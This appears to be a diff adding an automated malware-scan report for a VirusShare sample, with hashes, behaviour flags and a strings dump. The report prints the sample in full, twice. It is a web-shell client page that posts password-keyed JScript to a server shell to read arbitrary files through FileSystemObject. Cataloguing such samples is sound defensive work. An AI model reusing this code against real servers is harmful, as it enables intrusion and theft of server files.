@@ -1,0 +1,66 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "Base64 Strings": "Base64-encoded str were detected, may be used to obfuscate str",
+            "write": "May write to a file"
+        },
+        "macro": "<HTML >\n<HEAD>\n<META HTTP-EQUIV=\"Content-Type\" CONTENT=\"text/html; charset=gb2312\" />\n<TITLE>\ufffd\u0f2d\u0534\ufffd\ufffd\ufffd\ufffd</TITLE>\n<link rel=\"stylesheet\" type=\"text/css\" href=\"css.css\">\n</HEAD>\n<BODY scroll=\"no\" TOPMARGIN=\"0\"  LEFTMARGIN=\"0\" MARGINHEIGHT=\"0\" MARGINWIDTH=\"0\">\n\nInput Path: <input style=\"WIDTH:90%\" type=\"text\" name=\"path\" value=\"g:\\asp\\2004.asp\" />\n\n<form name=\"codeform\" method=\"post\" action=\"\" target=_blank>\n<textarea name=\"code\"></textarea>\n</form>\n\n<script>\nfunction RUNonclick(){\nwith(document.codeform){\ncode.value=js.value+\"wjj('\"+path.value.replace(/\\\\/g,'\\\\\\\\')+\"');\\r\\nResponse.write(xie+'<\\/textarea>');\";\ncode.name=parent.PW.value;\naction=parent.url.value;\nsubmit();\n}\n}\n</script>\n\n<textarea style=\"display:none;\"  name=\"js\">\nvar fso = new ActiveXObject(\"Scripting.FileSystemObject\");\nvar a=/<\\//g;\na.compile(\"<\\/\",\"g\");\n\nfunction wjj(f){\nvar _r=fso.OpenTextFile(f,1);\nxie+=_r.ReadAll().replace(a, \"&amp;lt\\/\");\n_r.close();\n}\n\nvar xie=\"<textarea style='HEIGHT:90%;WIDTH:100%'>\";\n//wjj(\"g:\\\\asp\\\\2004.asp\");\n//Response.write(xie+'<\\/textarea>');\n</textarea>\n\n</BODY></HTML>"
+    },
+    "filename": "VirusShare_36da727217e07c55c86f21bde8a65342",
+    "filesize": 1123,
+    "filetype": "HTML document, ISO-8859 text, with CRLF line terminators",
+    "hashes": {
+        "md5": "36da727217e07c55c86f21bde8a65342",
+        "sha1": "cfcd8242e2cfa93776438f97a9506c0103911c75",
+        "sha256": "710131ce795573faffbf977cdc8045b1af4eef332e27eab6c0ed60c2df674714"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "<HTML >",
+            "<HEAD>",
+            "<META HTTP-EQUIV=\"Content-Type\" CONTENT=\"text/html; charset=gb2312\" />",
+            "<TITLE>\u0f2d\u0534</TITLE>",
+            "<link rel=\"stylesheet\" type=\"text/css\" href=\"css.css\">",
+            "</HEAD>",
+            "<BODY scroll=\"no\" TOPMARGIN=\"0\"  LEFTMARGIN=\"0\" MARGINHEIGHT=\"0\" MARGINWIDTH=\"0\">",
+            "Input Path: <input style=\"WIDTH:90%\" type=\"text\" name=\"path\" value=\"g:\\asp\\2004.asp\" />",
+            "<form name=\"codeform\" method=\"post\" action=\"\" target=_blank>",
+            "<textarea name=\"code\"></textarea>",
+            "</form>",
+            "<script>",
+            "function RUNonclick(){",
+            "with(document.codeform){",
+            "code.value=js.value+\"wjj('\"+path.value.replace(/\\\\/g,'\\\\\\\\')+\"');\\r\\nResponse.write(xie+'<\\/textarea>');\";",
+            "code.name=parent.PW.value;",
+            "action=parent.url.value;",
+            "submit();",
+            "</script>",
+            "<textarea style=\"display:none;\"  name=\"js\">",
+            "var fso = new ActiveXObject(\"Scripting.FileSystemObject\");",
+            "var a=/<\\//g;",
+            "a.compile(\"<\\/\",\"g\");",
+            "function wjj(f){",
+            "var _r=fso.OpenTextFile(f,1);",
+            "xie+=_r.ReadAll().replace(a, \"&amp;lt\\/\");",
+            "_r.close();",
+            "var xie=\"<textarea style='HEIGHT:90%;WIDTH:100%'>\";",
+            "//wjj(\"g:\\\\asp\\\\2004.asp\");",
+            "//Response.write(xie+'<\\/textarea>');",
+            "</textarea>",
+            "</BODY></HTML>"
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": []
+    },
+    "time": "0:00:00.259272",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
